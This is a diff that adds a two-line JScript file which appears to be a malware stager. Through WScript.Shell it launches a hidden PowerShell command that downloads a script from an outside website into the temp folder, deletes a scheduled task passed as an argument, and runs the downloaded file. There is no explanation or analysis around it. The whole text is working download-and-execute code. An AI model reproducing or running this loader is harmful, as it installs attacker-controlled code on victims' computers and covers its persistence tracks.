@@ -1,0 +1,2 @@
+var aoj=new ActiveXObject("WScript.Shell")
+aoj.Run("powershell -com \"IWR -useb 'https://www.shalom.pt/50/pororocage.php' -outf $env:tmp\\8M7AR1UWEOPL.js; schtasks /delete /tn " + WScript.arguments(0) + " /f; wscript $env:tmp\\8M7AR1UWEOPL.js \"", 0)
